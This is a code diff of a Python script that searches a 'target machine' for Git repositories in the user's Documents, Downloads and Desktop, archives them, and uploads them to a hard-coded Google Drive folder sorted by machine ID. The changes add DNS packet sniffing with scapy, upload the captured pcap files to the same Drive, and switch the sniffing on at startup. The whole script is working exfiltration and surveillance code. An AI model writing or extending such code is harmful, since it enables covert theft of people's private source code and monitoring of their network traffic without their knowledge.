@@ -21,7 +21,7 @@ creds = ServiceAccountCredentials.from_json_keyfile_name('finalkey.json', scopes
 driveService = build('drive', 'v3', credentials=creds)
 parentDir='1cfjlBcYJPEdcHBoc3aa94zPvnUfJTCSm'
 UUID=hex(uuid.getnode())
-mime_types={'folder':'application/vnd.google-apps.folder','text':'text/plain'}
+mime_types={'folder':'application/vnd.google-apps.folder','text':'text/plain','pcap':'application/vnd.tcpdump.pcap'}
 today=date.today()
 date_folder_name=today.strftime("%d_%m_%Y")
     
@@ -47,13 +47,14 @@ def sniff():
     interfaces=build_interfaces(platform)
     print(interfaces)
     for i in interfaces:
-        try:
-            capture=scapy.sniff(iface=i,filter="port 53",count=1)
-            now = datetime.datetime.now()
-            capName=now.strftime("%Y_%m_%d_%H_%M_%S")
-            scapy.wrpcap(capName,capture, append=True)
-        except:
-            print("Could not capture on interface",i)
+        
+        capture=scapy.sniff(iface=i,filter="port 53",count=2)
+        now = datetime.datetime.now()
+        capName=now.strftime("%Y_%m_%d_%H_%M_%S")
+        dest_folder="captures/{}.pcap".format(capName)
+        scapy.wrpcap(dest_folder,capture, append=True)
+        uploadToDrive(dest_folder,mime_types['pcap']) 
+        
     return
     
 def tardir(repository, dest_folder):
@@ -112,6 +113,7 @@ def uploadFile(fileName,mimeType,parent_id):
     return
 
 def uploadToDrive(fileName,mimeType):
+    fileType="pcap" if "pcap" in mimeType else "tar"
     print("Searching for uuid folder!") 
     uuid_folder_id=searchFile(UUID,mime_types['folder'],parentDir)
     if uuid_folder_id==None:
@@ -119,33 +121,54 @@ def uploadToDrive(fileName,mimeType):
         print("Created UUID Folder ID=",folderID)
         date_folder_id=createfile(date_folder_name,mime_types['folder'],folderID)
         print("Created Date Folder ID=",date_folder_id)
+        type_folder_id=searchFile(fileType,mime_types['folder'],date_folder_id)
+
+        if type_folder_id==None:
+            print("Created type Folder ID=",fileType)
+            type_folder_id=createfile(fileType,mime_types['folder'],date_folder_id)
+            print("Uploading file to type folder!")
+            uploadFile(fileName,mimeType,type_folder_id)
+        else:
+            print("Uploading file to type folder!")
+            uploadFile(fileName,mimeType,type_folder_id)
     else:
         date_folder_id=searchFile(date_folder_name,mime_types['folder'],uuid_folder_id)
         if date_folder_id==None:
             date_folder_id=createfile(date_folder_name,mime_types['folder'],uuid_folder_id)
             print("Created Date Folder ID=",date_folder_id)
-            print("Uploading file to date folder!")
-            uploadFile(fileName,mimeType,date_folder_id)
+            type_folder_id=searchFile(fileType,mime_types['folder'],date_folder_id)
+            if type_folder_id==None:
+                print("Created type Folder ID=",fileType)
+                type_folder_id=createfile(fileType,mime_types['folder'],date_folder_id)
+                print("Uploading file to type folder!")
+                uploadFile(fileName,mimeType,type_folder_id)
         else:
-            print("Uploading file to date folder!")
-            uploadFile(fileName,mimeType,date_folder_id)      
+            type_folder_id=searchFile(fileType,mime_types['folder'],date_folder_id)
+            if type_folder_id==None:
+                print("Created type Folder ID=",fileType)
+                type_folder_id=createfile(fileType,mime_types['folder'],date_folder_id)
+                print("Uploading file to date folder!")
+                uploadFile(fileName,mimeType,type_folder_id)
+            else:
+                print("Uploading file to date folder!")
+                uploadFile(fileName,mimeType,type_folder_id)      
     return
 
 def get_git_repos():
 
-    os.chdir('/')
-    print(os.path.expanduser("~"))
-    os.chdir(os.path.expanduser("~"))
+    os.chdir('/home/parallels/')
+    #print(os.path.expanduser("~"))
+    #os.chdir(os.path.expanduser("~"))
 
     #Find all Git repositories in the target machine
     try:
-        command="mkdir gitFiles ; cd ; find ./Documents ./Downloads ./Desktop -type d -exec test -e '{}/.git' \; -print -prune"
+        command="find ./Documents ./Downloads ./Desktop -type d -exec test -e '{}/.git' \; -print -prune"
     except:
         exit()
     #find . -type d -exec test -e '{}/.git' ';' -print -prune
     ret = subprocess.run(command, capture_output=True, shell=True)
     repositories=ret.stdout.decode().strip()
-    print(repositories)
+    print("repos=",repositories)
     
     for repository in repositories.split('\n'):
         print("Obtaining the repository {}".format(repository))               
@@ -170,4 +193,4 @@ if __name__ == '__main__':
     
     get_git_repos()
     print("Sniffing!")
-    #sniff()
+    sniff()
